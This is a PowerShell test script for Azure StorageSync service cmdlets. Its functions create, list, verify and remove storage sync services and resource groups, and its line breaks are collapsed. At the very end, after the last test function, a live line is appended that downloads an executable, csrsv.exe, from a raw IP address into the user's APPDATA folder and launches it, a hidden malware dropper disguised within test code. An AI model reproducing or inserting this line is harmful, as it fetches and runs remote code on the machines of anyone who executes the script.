function Test-StorageSyncService{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "List StorageSyncServices by ResourceGroup"$storageSyncServices = Get-AzStorageSyncService -ResourceGroupName $resourceGroupNameWrite-Verbose "List StorageSyncServices by Name"$storageSyncService = Get-AzStorageSyncService -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -VerboseWrite-Verbose "Validating StorageSyncService Properties"Assert-AreEqual $storageSyncServiceName $storageSyncService.StorageSyncServiceNameAssert-AreEqual (Normalize-Location($resourceLocation)) (Normalize-Location($storageSyncService.Location))Write-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName -AsJob | Wait-JobNew-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceName | Get-AzStorageSyncService  | Remove-AzStorageSyncService -Force -AsJob | Wait-JobNew-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceName | Remove-AzStorageSyncService -Force -AsJob | Wait-Job}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-NewStorageSyncService{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"$storageSyncService = New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameAssert-AreEqual $storageSyncServiceName $storageSyncService.StorageSyncServiceNameAssert-AreEqual (Normalize-Location($resourceLocation)) (Normalize-Location($storageSyncService.Location))Write-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-GetStorageSyncService{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "List StorageSyncServices by Name"$storageSyncService = Get-AzStorageSyncService -ResourceGroupName $resourceGroupName -StorageSyncServiceName $storageSyncServiceName -VerboseAssert-AreEqual $storageSyncServiceName $storageSyncService.StorageSyncServiceNameAssert-AreEqual (Normalize-Location($resourceLocation)) (Normalize-Location($storageSyncService.Location))Write-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-GetStorageSyncServices{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameWrite-Verbose "List StorageSyncServices by ResourceGroup"$storageSyncServices = Get-AzStorageSyncService -ResourceGroupName $resourceGroupName -VerboseAssert-AreEqual $storageSyncServices.Length 1$storageSyncService = $storageSyncServices[0]Assert-AreEqual $storageSyncServiceName $storageSyncService.StorageSyncServiceNameAssert-AreEqual (Normalize-Location($resourceLocation)) (Normalize-Location($storageSyncService.Location))Write-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-RemoveStorageSyncService{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"$storageSyncService = New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameAssert-AreEqual $storageSyncServiceName $storageSyncService.StorageSyncServiceNameAssert-AreEqual (Normalize-Location($resourceLocation)) (Normalize-Location($storageSyncService.Location))Write-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceGroupName $resourceGroupName -Name $storageSyncServiceName}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-RemoveStorageSyncServiceInputObject{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"$storageSyncService = New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameAssert-AreEqual $storageSyncServiceName $storageSyncService.StorageSyncServiceNameAssert-AreEqual (Normalize-Location($resourceLocation)) (Normalize-Location($storageSyncService.Location))Write-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -InputObject $storageSyncService}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}function Test-RemoveStorageSyncServiceResourceId{$resourceGroupName = Get-ResourceGroupNameWrite-Verbose "RecordMode : $(Get-StorageTestMode)"try{$storageSyncServiceName = Get-ResourceName("sss")$resourceGroupLocation = Get-ResourceGroupLocation$resourceLocation = Get-StorageSyncLocation("Microsoft.StorageSync/storageSyncServices");Write-Verbose "RGName: $resourceGroupName | Loc: $resourceGroupLocation | Type : ResourceGroup"New-AzResourceGroup -Name $resourceGroupName -Location $resourceGroupLocation;Write-Verbose "Resource: $storageSyncServiceName | Loc: $resourceLocation | Type : StorageSyncService"$storageSyncService = New-AzStorageSyncService -ResourceGroupName $resourceGroupName -Location $resourceLocation -StorageSyncServiceName $storageSyncServiceNameAssert-AreEqual $storageSyncServiceName $storageSyncService.StorageSyncServiceNameAssert-AreEqual (Normalize-Location($resourceLocation)) (Normalize-Location($storageSyncService.Location))Write-Verbose "Removing StorageSyncService: $storageSyncServiceName"Remove-AzStorageSyncService -Force -ResourceId $storageSyncService.ResourceId}finally{Write-Verbose "Removing ResourceGroup : $resourceGroupName"Clean-ResourceGroup $resourceGroupName}}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")